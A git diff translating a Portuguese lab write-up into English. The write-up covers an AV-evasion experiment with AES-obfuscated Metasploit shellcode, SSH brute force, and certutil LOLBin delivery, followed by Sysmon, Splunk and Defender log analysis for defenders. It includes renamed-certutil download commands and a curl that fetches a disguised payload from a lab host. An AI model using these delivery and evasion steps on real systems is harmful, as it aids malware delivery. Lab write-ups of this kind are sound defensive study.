@@ -1,12 +1,10 @@
 # 🛡️ Evasão e Execução: Criando, Ofuscando e Entregando Shellcode com AES e PyInstaller
 
 
-## 
+## OVERVIEW
 
 In this technical write-up, we conduct a hands-on experiment simulating a Windows defense evasion attack. We create a payload using Metasploit, obfuscate it with AES encryption in Python, and package the malware with PyInstaller.
-
 For delivery, we explore a realistic scenario: an SSH brute-force attack followed by using ```certutil.exe``` to download the payload—a technique often classified as Living Off the Land Binary (LOLBin).
-
 Throughout the process, we analyze artifacts with Sysmon and Splunk, documenting key indicators and behaviors for SOC analysts and blue teamers.
 
 ---
@@ -29,7 +27,7 @@ Never execute these techniques on systems you do not own or lack explicit author
 ---
 
 
-## 🧪 Splunk Configuration Issues 
+## 🧪 SPLUNK CONFIGURATION ISSUES
 
 
 During Splunk setup, I encountered issues receiving Sysmon logs in the Splunk GUI. After troubleshooting, I discovered it was a Windows permissions problem. In the Services panel, under the Log On tab, the Local System Account option must be selected, as shown below:
@@ -85,7 +83,7 @@ For evasion, I chose ```HeapAlloc```.
 Note: Later, I learned VirtualAlloc + VirtualProtect might be more effective for bypassing defenses—a topic for future research.
 
 
-### Python Execution Script
+### PYTHON EXECUTION SCRIPT
 
 This script decrypts the AES-CBC shellcode (stored in Base64), removes PKCS7 padding, allocates executable memory in a private heap, and runs the shellcode via CreateThread.PKCS7 is a padding method used in block ciphers like AES to ensure data fits the cipher's block size (e.g., 16 bytes for AES-128).
 
@@ -285,10 +283,9 @@ Even though the URL points to a legitimate domain (Google), Microsoft Defender f
 This indicates that Windows Defender's protection system does not rely solely on the destination of network requests, but also monitors the behavior of processes within the system (behavior-based detection).
 
 
- ### 2 TENTATIVA:
+ ### Second Delivery Attempt:
 
-Vamos tirar a prova final tentando uma ultima tecnica, vou criar uma copia do certutil.exe em um outro folder com um 
- outro nome e vou tentar realizar uma requisicao atraves desta copia, abaixo vou deixar os comandos usados e a resposta recebida.
+Let's make a final test using one last technique. This time, I created a copy of certutil.exe in a different folder, renamed it, and used this renamed copy to perform a network request. Below are the commands executed and the response received:
 
 ```
 1.
@@ -297,52 +294,56 @@ copy C:\Windows\System32\certutil.exe C:\Users\Public\curl.exe
 C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com
 ```
 
-
- [RESPOSTA DA SEGUNDA TENTATIVA USANDO CERTUTIL]
+[RESPONSE FROM THE SECOND ATTEMPT]
  ![Image](https://github.com/user-attachments/assets/1d7c7848-f616-4888-bb17-a946f862cb52)
 
-Mesmo executando o comando de um outro diretorio e fazendo uma requisicao para um site confiavel o Windows Defender detectou a atividade e bloqueou a acao.
+Even though the command was executed from a different directory and targeted a trusted website, Windows Defender still detected the activity and blocked it.
+This clearly demonstrates that Defender does not rely solely on file names, paths, or destination URLs — it also monitors behavior patterns to detect suspicious activity.
 
-### 3 TENTATIVA 
+### Third Delivery Attempt
 
-Ja que nao podemos usar certutil para realizar o download vou fazer uma requisicao curl simples para verificar se o defender identifica a presenca do malware
+Since certutil can't be used to download the payload, I decided to perform a simple curl request to check whether Windows Defender would still detect the malware:
 
 ```curl http://192.168.56.101:7070/WindowsUpdateService```
 ![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)
 
 
- Mesmo com a encryptacao e ofuscacao o windows defender detectou a presenca do malware e o bloqueou porem 
- essa atividade gerou alguns logs interessantes que vamos analisar no proximo capitulo
+ Even though the payload was encrypted and obfuscated, Windows Defender successfully detected and blocked the malware.
+However, this activity generated some interesting logs, which we’ll dive into in the next chapter:
 
 ![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)
 
 
 ---
 
-## 🔍 ANALISE DOS LOGS
+## 🔍 LOG ANALYSIS
 
-**Note:** Para escrever esse artigo realizei a entrega do malware muitas vezes em dias diferentes entao nao se prendam muito as datas dos logs 
+Note: I delivered the malware multiple times over different days while writing this article, so don’t rely too much on the timestamps in the logs.s 
 
 
 1. [BRUTE FORCE EVIDENCE]
 ![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)
-Essa quantidade tentativa de login em tao pouco tempo capturadas pelo splunk acende uma red flag analisando mais 
-a fundo nos logs em sysmon encontamos mais uma eveidencia de atividade maliciosa
-Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Event Viewer registrou os seguintes comportamentos:
 
-2. [CREATION OF REMOTE TREAT]
+This high number of login attempts in such a short time, captured by Splunk, raises a red flag.
+Analyzing the Sysmon logs more deeply, we found further evidence of malicious activity.
+During the execution of the obfuscated payload, even before a shell was established, the Event Viewer recorded the following behaviors:
+
+3. [REMOTE THREAD CREATION DETECTED]
  ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
-Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Entretanto nos ja sabemos que o malware nao foi nem se quer baixado
-entao eu acredito que este log foi acionado quando eu solicitei um cmd.exe via ssh, mesmo que nao esteja diretamente relacionado com o malware ainda sim e um artefato importante.
 
-3. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
+This type of event is typical of malware attempting to execute code in another process to evade detection (such as DLL injection). However, since we already know the malware was not executed, I believe this log was triggered when I requested a cmd.exe session via SSH.Although it is not directly related to the malware, it remains an important artifact.
+
+5. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
 ![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
-Pouco após a tentativa download via cetutil.exe, o processo SecurityHealthHost.exe, parte do Windows Defender, foi invocado. Isso sugere que a carga/acao maliciosa foi identificada e bloqueada pela solução nativa do sistema, interrompendo a execução completa do ataque.
 
-4. [IDENTIFICACAO PELO SISTEMA DE DEFESA]
+Shortly after the download attempt via certutil.exe, the SecurityHealthHost.exe process, a component of Windows Defender, was triggered. This suggests that the malicious payload/action was detected and blocked by the system’s native security solution, preventing the full execution of the attack.
+
+***Windows Defender Logs***
+
+6. [DETECTION]
 ![Image](https://github.com/user-attachments/assets/e1290956-49f1-473f-90bc-caf32dd7de12)
 
-Neste log vemos a identificao pelo Windows Defender da tentativa de LOLbin separei os detalhes mais importantes no prompt abaixo. 
+In this log, we see Windows Defender detecting a LOLBin attempt. I've highlighted the most important details below:
 
 ```
 Threat Name:      Trojan:Win32/Ceprolad.A  
@@ -355,29 +356,25 @@ Path:             C:\Windows\System32\certutil.exe
 Action Taken:     Not Applicable 
 ```
 
-Como podemos ver o Windows Defender bloqueou a requisicao antes que houve a conexao por isso nao foi identificado o IP.
+As we can see, Windows Defender blocked the request before the connection was established, which is why the IP address was not identified.
 
-
-4.[CONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
+4.[CONFIRMATION OF BLOCKING BY THE DEFENSE SYSTEM]
 ![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)
 
-Neste ultimo log nos temos a confirmacao de que a ameca foi removida com sucesso pelo windows defender ```Action Name: Remove```, ``` The operation completed successfully.```
+Here we have confirmation that the threat was successfully removed by Windows Defender, indicated by ```Action Name: Remove``` and the message ```The operation completed successfully```.
 
-5.[IDENTIFICACAO DA SEGUNDA TENTATIVA]
+5.[SECOND ATTEMPT IDENTIFICATION]
 ![Image](https://github.com/user-attachments/assets/aa39d6f0-9dad-4fba-831c-7bfe3a810af9)
 
 ```Path CmdLine:_C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com```
 
-Por ultimos mas nao menos importante temos a confirmacao que o Windows Defender localizaou a execucao maliciosa do
-certutil.exe mesmo em um outro diretorio e com um nome diferente.
+Last but not least, we have confirmation that Windows Defender detected the malicious execution of
+```certutil.exe``` even when it was copied to another directory and renamed.
 
-##CONCLUSAO 
+##THOUGHTS
 
-Embora meu foco atual esteja na área de segurança defensiva, este laboratório acabou explorando técnicas ofensivas mais profundamente do que eu esperava. A criação e ofuscação do shellcode me deram uma visão prática de como cargas maliciosas podem ser construídas e executadas de forma discreta no Windows.
-
-Apesar de o código ainda poder ser aprimorado com técnicas mais avançadas de evasão, essa experiência me proporcionou um entendimento mais concreto sobre como o Windows Defender e outras soluções de segurança operam, além de como algumas técnicas simples já são suficientes para contornar mecanismos de defesa padrão.
-
-No contexto defensivo, isso reforça a importância de conhecer as ferramentas e táticas do adversário para desenvolver detecções mais eficazes, tanto em ambientes corporativos quanto em labs de threat hunting.
-
+Although my current focus is on defensive security, this lab ended up exploring offensive techniques more deeply than I expected. The creation and obfuscation of the shellcode gave me a practical insight into how malicious payloads can be built and executed discreetly on Windows.
+Although the code can still be improved with more advanced evasion techniques, this experience provided me with a more concrete understanding of how Windows Defender and other security solutions operate.
+In the defensive context, this reinforces the importance of knowing the adversary's tools and tactics to develop more effective detections, both in corporate environments and in threat hunting labs.
 
 
